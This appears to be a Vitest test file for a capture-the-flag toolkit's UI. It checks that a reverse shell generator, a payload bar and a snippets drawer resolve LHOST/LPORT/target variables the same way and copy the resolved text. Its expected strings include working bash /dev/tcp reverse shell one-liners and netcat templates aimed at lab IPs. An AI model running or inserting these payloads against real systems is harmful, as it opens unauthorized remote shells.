import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { useCtfStore } from '../../store/useCtfStore';
import { ReverseShellGenerator } from '../../components/cheatsheet/ReverseShellGenerator';
import { FloatingPayloadBar } from '../../components/common/FloatingPayloadBar';
import { SnippetsDrawer } from '../../components/layout/SnippetsDrawer';
import { resolveTemplate, contextFromGlobalVars } from '../../utils/variableSubstitution';

// Covers item 6.3: ReverseShellGenerator, FloatingPayloadBar and SnippetsDrawer
// all resolve variables through the shared variableSubstitution engine, so the
// same LHOST/LPORT/target produce the same resolved text everywhere, and copy
// always copies the resolved text.

const ENGAGED_MACHINE = {
  id: 'test-box',
  name: 'Pickle Rick',
  ip: '10.10.10.42',
  os: 'Linux',
  platform: 'HTB',
  difficulty: 'Easy',
  status: 'backlog',
  tags: ['Web'],
  certifications: [],
  roomUrl: '',
  timeSpentSeconds: 0,
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
};

function baseState(overrides: Record<string, unknown> = {}) {
  return {
    globalVars: {
      lhost: '10.10.14.99',
      lport: '9001',
      targetIp: '10.10.10.200',
      interface: 'tun0',
      customVars: {},
    },
    machines: [],
    activeTargetId: null,
    soundEnabled: false,
    ...overrides,
  };
}

/** Matches text split across syntax-highlighter child spans by comparing
 * the whole element's textContent rather than a single text node. */
function byExactTextContent(expected: string) {
  return (_content: string, element: Element | null) => element?.textContent === expected;
}

describe('variable substitution engine adoption across UIs', () => {
  beforeEach(() => {
    Object.defineProperty(window, 'isSecureContext', { value: true, configurable: true });
    Object.assign(navigator, {
      clipboard: { writeText: vi.fn().mockResolvedValue(undefined) },
    });
  });

  it('ReverseShellGenerator resolves {ip}/{port}/{shell} via the shared engine and copies the resolved text', async () => {
    useCtfStore.setState(baseState());
    render(<ReverseShellGenerator />);

    // Default selected shell is "Bash -i": `{shell} -i >& /dev/tcp/{ip}/{port} 0>&1`
    const expected = '/bin/bash -i >& /dev/tcp/10.10.14.99/9001 0>&1';
    expect(screen.getAllByText(byExactTextContent(expected)).length).toBeGreaterThan(0);

    fireEvent.click(screen.getByText('Copy payload'));
    await waitFor(() => {
      expect(navigator.clipboard.writeText).toHaveBeenCalledWith(expected);
    });
  });

  it('FloatingPayloadBar resolves {LHOST}/{LPORT} quick-shell templates via the shared engine and copies the resolved text', async () => {
    useCtfStore.setState(baseState());
    render(<FloatingPayloadBar />);
    fireEvent.click(screen.getByText('10.10.14.99:9001'));
    fireEvent.click(screen.getByText(/Quick 1-Click Reverse Shells/i));

    const expected = resolveTemplate(
      'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
      contextFromGlobalVars(useCtfStore.getState().globalVars)
    ).text;
    expect(expected).toBe('bash -i >& /dev/tcp/10.10.14.99/9001 0>&1');
    expect(screen.getAllByText(byExactTextContent(expected)).length).toBeGreaterThan(0);

    fireEvent.click(screen.getByText('Bash -i').closest('div')!);
    await waitFor(() => {
      expect(navigator.clipboard.writeText).toHaveBeenCalledWith(expected);
    });
  });

  it('SnippetsDrawer resolves {TARGET_IP}/{LHOST}/{LPORT} cheatsheet templates via the shared engine and copies the resolved text', async () => {
    useCtfStore.setState(
      baseState({
        cheatsheets: [
          {
            id: 'custom-engine-test',
            title: 'Engine Test Command',
            category: 'network',
            description: 'test',
            commandTemplate: 'nc -nv {TARGET_IP} and revshell to {LHOST}:{LPORT}',
            tags: ['test'],
          },
        ],
        snippetsDrawerOpen: true,
      })
    );
    render(
      <MemoryRouter>
        <SnippetsDrawer />
      </MemoryRouter>
    );

    const expected = 'nc -nv 10.10.10.200 and revshell to 10.10.14.99:9001';
    expect(screen.getByText(expected)).toBeInTheDocument();

    fireEvent.click(screen.getByText('Copy'));
    await waitFor(() => {
      expect(navigator.clipboard.writeText).toHaveBeenCalledWith(expected);
    });
  });

  it('SnippetsDrawer shows the shared "unresolved variable" warning when LHOST is unset', () => {
    useCtfStore.setState(
      baseState({
        globalVars: { lhost: '', lport: '9001', targetIp: '10.10.10.200', interface: 'tun0', customVars: {} },
        cheatsheets: [
          {
            id: 'custom-unresolved-test',
            title: 'Unresolved Test Command',
            category: 'network',
            description: 'test',
            commandTemplate: 'revshell to {LHOST}:{LPORT}',
            tags: ['test'],
          },
        ],
        snippetsDrawerOpen: true,
      })
    );
    render(
      <MemoryRouter>
        <SnippetsDrawer />
      </MemoryRouter>
    );
    expect(screen.getByText('Missing:', { exact: false })).toBeInTheDocument();
    expect(screen.getByTitle(/Warning: contains unresolved tokens \(LHOST\)/)).toBeInTheDocument();
  });

  it('resolves the same template identically for ReverseShellGenerator-style and FloatingPayloadBar-style tokens given the same globalVars', () => {
    const ctx = contextFromGlobalVars(baseState().globalVars as any);
    const viaLowercase = resolveTemplate('{ip}:{port}', ctx);
    const viaUppercase = resolveTemplate('{LHOST}:{LPORT}', ctx);
    expect(viaLowercase.text).toBe(viaUppercase.text);
    expect(viaLowercase.text).toBe('10.10.14.99:9001');
  });

  it('prefers the actively engaged target IP over the global RHOST consistently across SnippetsDrawer and the engine', () => {
    useCtfStore.setState(
      baseState({
        machines: [ENGAGED_MACHINE],
        activeTargetId: ENGAGED_MACHINE.id,
        cheatsheets: [
          {
            id: 'custom-precedence-test',
            title: 'Precedence Test Command',
            category: 'network',
            description: 'test',
            commandTemplate: 'nmap {TARGET_IP}',
            tags: ['test'],
          },
        ],
        snippetsDrawerOpen: true,
      })
    );
    render(
      <MemoryRouter>
        <SnippetsDrawer />
      </MemoryRouter>
    );
    // Engaged target IP (10.10.10.42) wins over globalVars.targetIp (10.10.10.200)
    expect(screen.getByText('nmap 10.10.10.42')).toBeInTheDocument();
  });
});
